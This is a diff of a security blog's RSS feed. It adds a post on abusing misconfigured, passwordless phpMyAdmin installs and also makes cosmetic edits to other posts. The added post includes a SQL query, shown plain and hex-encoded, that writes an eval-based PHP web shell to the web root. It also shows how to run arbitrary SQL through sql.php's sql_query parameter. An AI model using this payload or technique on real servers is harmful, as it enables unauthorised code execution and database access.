@@ -5,9 +5,76 @@
     <description>A blog about programming and network security</description>
     <link>/</link>
     <atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Mon, 11 Apr 2016 14:37:26 +0800</pubDate>
-    <lastBuildDate>Mon, 11 Apr 2016 14:37:26 +0800</lastBuildDate>
+    <pubDate>Wed, 13 Apr 2016 15:23:59 +0800</pubDate>
+    <lastBuildDate>Wed, 13 Apr 2016 15:23:59 +0800</lastBuildDate>
     <generator>Jekyll v3.1.2</generator>
+    
+      <item>
+        <title>phpmyadmin独家技能</title>
+        <description>&lt;h3 id=&quot;x01-base&quot;&gt;0x01 Base&lt;/h3&gt;
+
+&lt;h4 id=&quot;website-has-phpmyadmin&quot;&gt;1&amp;gt;website has phpmyadmin&lt;/h4&gt;
+
+&lt;h4 id=&quot;phpmyadmin-can-be-logined-by-anyone-without-password&quot;&gt;2&amp;gt;phpmyadmin can be logined by anyone without password&lt;/h4&gt;
+
+&lt;h4 id=&quot;the-strongtblsqlphpstrong-has-been-deleted-by-website-manager-or-someone-else&quot;&gt;3&amp;gt;the &lt;strong&gt;tbl_sql.php&lt;/strong&gt; has been deleted by website manager or someone else&lt;/h4&gt;
+
+&lt;h3 id=&quot;x02-about&quot;&gt;0x02 About&lt;/h3&gt;
+
+&lt;h4 id=&quot;the-web-server-runs-phpmyadminbut-with-wrong-setupmakes-it-possible-for-anyone-to-logined-in-phpmyadmin-without-passwordand-able-to-read-the-root-password&quot;&gt;The web server runs phpmyadmin,but with wrong setup,makes it possible for anyone to logined in phpmyadmin without password,and able to read the root password.&lt;/h4&gt;
+
+&lt;h4 id=&quot;there-are-two-filesstrong-tblsqlphpsqlphpstrong-generallytblsqlphp-has-execute-sqlquery-function-like-below-picture-at-arrow-1sqlphp-has-view-sql-database-function-like-below-picture-at-arrow-2&quot;&gt;There are two files:&lt;strong&gt; tbl_sql.php,sql.php&lt;/strong&gt;. Generally,tbl_sql.php has execute sqlquery function like below picture at arrow 1,sql.php has view sql database function like below picture at arrow 2.&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;../../../../../pic/phpmyadmin/phpmyadmin160413.png&quot; /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;generallywhen-we-want-to-execute-sql-query-like&quot;&gt;generally,when we want to execute sql query like&lt;/h4&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;&amp;lt;? php @eval($_POST[cmd]);?&amp;gt;&#39;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;into&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dumpfile&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;/var/www/1.php&#39;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;or&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x3c3f2070687020406576616c28245f504f53545b636d645d293b3f3e&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;into&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dumpfile&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;/var/www/1.php&#39;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;we-will-find-this-does-not-work-here-coz-tblsqlphp-was-deletedit-works-out-like-below-404-error-when-i-try-to-execute-above-query&quot;&gt;we will find this does not work here coz tbl_sql.php was deleted.It works out like below 404 error when I try to execute above query:&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;../../../../../pic/phpmyadmin/phpmyadmin160413_2.png&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;x03-exploit&quot;&gt;0x03 Exploit&lt;/h3&gt;
+
+&lt;h4 id=&quot;use-strongsqlphpstrong-to-execute-sqlquery&quot;&gt;&amp;gt; use &lt;strong&gt;sql.php&lt;/strong&gt; to execute sqlquery&lt;/h4&gt;
+
+&lt;h4 id=&quot;usage&quot;&gt;&amp;gt; usage:&lt;/h4&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://xx.xx.xx/phpmyadmin/sql.php?xxx=xxx...&amp;amp;sql_query=[sqli]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;sqli-is-sqlquery-sentence-been-urlencoded&quot;&gt;&amp;gt; [sqli] is sqlquery sentence been urlencoded.&lt;/h4&gt;
+
+&lt;h4 id=&quot;egsqlqueryselect20version&quot;&gt;&amp;gt; eg.sql_query=select%20@@version&lt;/h4&gt;
+
+&lt;p&gt;&lt;em&gt;detail&lt;/em&gt;:&lt;/p&gt;
+
+&lt;h4 id=&quot;use-burpsuite-listening-browsers-postget-request-parameters-when-clicking-any-table-name-like-below&quot;&gt;1&amp;gt;use burpsuite listening browser’s post|get request parameters when clicking any table name like below:&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;../../../../../pic/phpmyadmin/phpmyadmin160413_3.png&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;add-add-get-request-parameter-sqlqueryselect20version&quot;&gt;2&amp;gt;add add get request parameter &lt;em&gt;sql_query=select%20@@version&lt;/em&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;../../../../../pic/phpmyadmin/phpmyadmin160413_4.png&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;find-sqli-has-been-execute&quot;&gt;3&amp;gt;find sqli has been execute&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;../../../../../pic/phpmyadmin/phpmyadmin160413_5.png&quot; /&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Tue, 12 Apr 2016 00:00:00 +0800</pubDate>
+        <link>/web/2016/04/12/phpmyadmin%E7%8B%AC%E5%AE%B6%E6%8A%80%E8%83%BD/</link>
+        <guid isPermaLink="true">/web/2016/04/12/phpmyadmin%E7%8B%AC%E5%AE%B6%E6%8A%80%E8%83%BD/</guid>
+        
+        <category>web</category>
+        
+        <category>phpmyadmin</category>
+        
+        
+        <category>web</category>
+        
+      </item>
     
       <item>
         <title>Inside network in workgroup</title>
@@ -282,6 +349,11 @@ rm -r ../tmp
 &lt;/code&gt;&lt;/pre&gt;
 &lt;/div&gt;
 
+&lt;h1 id=&quot;x04-update&quot;&gt;0x04 Update&lt;/h1&gt;
+&lt;h4&gt;16-04-13&lt;/h4&gt;
+&lt;h4&gt;&amp;gt;&amp;gt;&amp;gt;finally I find how to change the font-family in the code block to make code block looks beautiful,not ugly any longer. 1,2,3 arrows in below pic show the process to find how to change the code block font.Firstly,move mouse&#39;s arrow to any code block like arrow 1 in below pic,and right click mouse to chose &quot;use firebug to view elements&quot;.Secondly,left click mouse on the words like arrow 2 in below pic,and move mouse on &quot;font-family&quot;,then I find it&#39;s &quot;monospace&quot;,and the source css file is from &quot;\_includes\head.html&quot;,the value is href=&quot;//netdna.bootstrapcdn.com/bootstrap/3.1.1/css/bbbbootstrap.min.css&quot;,download it to local css directory and rename it my_code.css,change \_includes\head.html to set the value to &quot;../../../../../css/my_code.css&quot;.Finally,change monospace to &quot;文泉驿等宽正黑&quot; where needed in my_code.css &lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;../../../../../pic/jekyll/code_block_font.png&quot; /&gt;&lt;/p&gt;
+
 </description>
         <pubDate>Sat, 09 Apr 2016 00:00:00 +0800</pubDate>
         <link>/jekyll/2016/04/09/github-jekyll-blog/</link>
@@ -313,7 +385,7 @@ rm -r ../tmp
 &lt;/code&gt;&lt;/pre&gt;
 &lt;/div&gt;
 
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/xinghuacai/pic/master/spider_wooyun/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../../../../pic/spider_wooyun/3.png&quot; width=&quot;2200&quot; /&gt;&lt;/p&gt;
 
 &lt;h4 id=&quot;urllib2--httpproxy-http&quot;&gt;3&amp;gt;urllib2 默认会使用环境变量 http_proxy来设置 HTTP&lt;/h4&gt;
 
@@ -326,9 +398,9 @@ urllib2.install_opener(opener)
 &lt;/div&gt;
 
 &lt;h4 id=&quot;urllib2error-101refused1270018080linuxsethttpproxyhttpproxyvpnip&quot;&gt;这样就不会出现urllib2　error 101　refused的错误了，也可以将系统的127.0.0.1:8080的代理关掉。（linux中set命令可以看到http_proxy的值，http_proxy并不是vpn的ip）&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/xinghuacai/pic/master/spider_wooyun/4.png&quot; alt=&quot;4&quot; /&gt;
+&lt;p&gt;&lt;img src=&quot;../../../../../pic/spider_wooyun/4.png&quot; width=&quot;2200&quot; /&gt;
 &lt;img src=&quot;https://raw.githubusercontent.com/xinghuacai/pic/master/spider_wooyun/5.png&quot; alt=&quot;5&quot; /&gt;
-&lt;img src=&quot;https://raw.githubusercontent.com/xinghuacai/pic/master/spider_wooyun/6.png&quot; alt=&quot;6&quot; /&gt;
+&lt;img src=&quot;../../../../../pic/spider_wooyun/6.png&quot; width=&quot;3000&quot; /&gt;
 &lt;img src=&quot;https://raw.githubusercontent.com/xinghuacai/pic/master/spider_wooyun/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;
 
 &lt;h4 id=&quot;sublimerepl&quot;&gt;4&amp;gt;sublimeREPL插件&lt;/h4&gt;
@@ -425,8 +497,9 @@ urllib2.install_opener(opener)
       <item>
         <title>一道ctf训练营的web题writeup</title>
         <description>&lt;h2 id=&quot;x01-uri&quot;&gt;0x01 uri&lt;/h2&gt;
-&lt;p&gt;http://ctf.idf.cn/index.php?g=game&amp;amp;m=article&amp;amp;a=index&amp;amp;id=28
-&lt;img src=&quot;https://raw.githubusercontent.com/xinghuacai/pic/master/ctf-js/%E5%9B%BE%E7%89%871.png&quot; alt=&quot;anyname_1&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;http://ctf.idf.cn/index.php?g=game&amp;amp;m=article&amp;amp;a=index&amp;amp;id=28&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../../../../../pic/ctf-js/图片1.png&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;x02-flag&quot;&gt;0x02 求flag过程&lt;/h2&gt;
 
@@ -462,10 +535,10 @@ urllib2.install_opener(opener)
 &lt;/div&gt;
 
 &lt;h4 id=&quot;js&quot;&gt;需要本地建立相应文件夹并将两个js文件下载到目录：&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/xinghuacai/pic/master/ctf-js/%E5%9B%BE%E7%89%873.png&quot; alt=&quot;sdj&quot; /&gt;
-4&amp;gt;2中js代码转换成易看代码：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../../../../pic/ctf-js/图片3.png&quot; width=&quot;1000&quot; height=&quot;400&quot; border=&quot;5&quot; /&gt;&lt;br /&gt;
+4&amp;gt;2中js代码转换成易看代码：&lt;br /&gt;
+&lt;small&gt;用sublime text打开，安装JsFormat插件，可通过快捷键ctrl+alt+f,实现javascript代码自动对齐，js代码转换后变成：&lt;/small&gt;&lt;/p&gt;
 
-&lt;h4 id=&quot;sublime-textjsformatctrlaltfjavascriptjs&quot;&gt;用sublime text打开，安装JsFormat插件，可通过快捷键ctrl+alt+f,实现javascript代码自动对齐，js代码转换后变成：&lt;/h4&gt;
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;prompt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;\\u8f93\\u5165\\u4f60\\u7684\\x66\\x6c\\x61\\x67\\u5427\\uff0c\\u5c11\\u5e74\\uff01&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;\\x66\\x33\\x33\\x37\\x33\\x65\\x33\\x36\\x63\\x36\\x37\\x37\\x37\\x35\\x30\\x37\\x37\\x39\\x66\\x35\\x64\\x30\\x34\\x66\\x66\\x37\\x38\\x38\\x35\\x62\\x33\\x65&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sr&quot;&gt;/.+_.+_.+/gi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
@@ -492,7 +565,7 @@ urllib2.install_opener(opener)
 &lt;/code&gt;&lt;/pre&gt;
 &lt;/div&gt;
 
-&lt;h4 id=&quot;jshtmlhtmljs&quot;&gt;后将该js放进本地新建的html中，其中html内嵌js格式为：&lt;/h4&gt;
+&lt;p&gt;&lt;small&gt;后将该js放进本地新建的html中，其中html内嵌js格式为：&lt;/small&gt;&lt;/p&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
